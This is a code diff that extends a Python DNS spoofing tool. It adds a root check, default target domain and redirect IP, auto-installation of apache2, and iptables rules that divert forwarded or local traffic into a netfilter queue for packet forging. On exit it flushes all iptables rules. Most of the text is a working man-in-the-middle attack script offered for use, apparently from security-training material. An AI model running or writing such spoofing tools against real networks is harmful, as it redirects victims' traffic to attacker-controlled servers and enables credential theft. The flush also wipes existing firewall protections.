@@ -1,26 +1,78 @@
+#!/usr/bin/env python3
+
 import argparse             # https://docs.python.org/3/library/argparse.html
 import netfilterqueue       # https://github.com/oremanj/python-netfilterqueue
+import os                   # https://docs.python.org/3/library/os.html
 import scapy.all as scapy   # https://scapy.readthedocs.io/en/latest/index.html
+import subprocess           # https://docs.python.org/3/library/subprocess.html
+import sys                  # https://docs.python.org/3/library/sys.html
+import textwrap             # https://docs.python.org/3/library/textwrap.html
+
+
+def is_not_root():
+    return os.geteuid() != 0
 
 
 def get_args():
-    parser = argparse.ArgumentParser()
-    parser.add_argument(
-        "-d", "--domain", dest="domain", help="Specify a domain to spoof"
+    parser = argparse.ArgumentParser(
+        description="DNS spoof tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=textwrap.dedent(
+            """Example: 
+            dns_spoofer.py -q forward               # spoof domain on target (Windows)
+            dns_spoofer.py -d sqa.fyicenter.com     # domain
+            dns_spoofer.py -r 192.168.122.108       # redirection address
+            dns_spoofer.py                          # with defaults local, apache2 and fyicenter.com
+        """
+        ),
     )
-    parser.add_argument(
-        "-r", "--ip", dest="ip", help="Specify IP address to redirect to"
-    )
+    parser.add_argument("-d", "--domain", default="sqa.fyicenter.com", help="Domain to spoof")
+    parser.add_argument("-r", "--ip", default="192.168.122.108", help="IP address to redirect to")
+    parser.add_argument("-q", "--destination", default="local", help="Forward or local")
     values = parser.parse_args()
-    if not values.domain:
-        parser.error(
-            "[-] Please specify a domain to spoof, use --help for more information"
-        )
-    if not values.ip:
-        parser.error(
-            "[-] Please specify IP address to redirect to, use --help for more information"
-        )
     return values
+
+
+def apache_start():
+    print("[+] Starting apache2 service ...")
+    try:
+        subprocess.check_output(["service", "apache2", "start"])
+    except subprocess.CalledProcessError:
+        print("[-] Not found. Installing and starting apache2 service...")
+        subprocess.call("apt-get install apache2 -y", shell=True)
+        subprocess.call("service apache2 start", shell=True)
+
+
+def set_queue(destination, qnum):
+    if destination == "forward":
+        subprocess.call(
+            "iptables -I FORWARD -j NFQUEUE --queue-num {}".format(qnum),
+            shell=True,
+        )
+    elif destination == "local":
+        subprocess.call(
+            "iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(qnum),
+            shell=True,
+        )
+        subprocess.call(
+            "iptables -I INPUT -j NFQUEUE --queue-num {}".format(qnum),
+            shell=True,
+        )
+    else:
+        print("[-] Unknown destination")
+
+    # Create netfilterqueue instance
+    queue = netfilterqueue.NetfilterQueue()
+    # Bind queue number 0 (queue three in iptables)
+    queue.bind(qnum, process_packet)
+    # Run the queue
+    queue.run()
+
+
+def restore():
+    subprocess.call("iptables --flush", shell=True)
+    subprocess.call("service apache2 stop", shell=True)
+    print("[+] Done")
 
 
 def forge_packet(packet):
@@ -63,10 +115,14 @@ def process_packet(packet):
     packet.accept()
 
 
-options = get_args()
-# Create netfilterqueue instance
-queue = netfilterqueue.NetfilterQueue()
-# Bind queue number 0 (queue zero in iptables)
-queue.bind(0, process_packet)
-# Run the queue
-queue.run()
+if __name__ == "__main__":
+    if is_not_root():
+        sys.exit("[-] This script requires superuser privileges.")
+
+    options = get_args()
+    try:
+        apache_start()
+        set_queue(options.destination, 3)
+    except KeyboardInterrupt:
+        print("[+] \nDetected CTRL+C ... Restoring normal connections and flush iptables queue(s) ...")
+        restore()
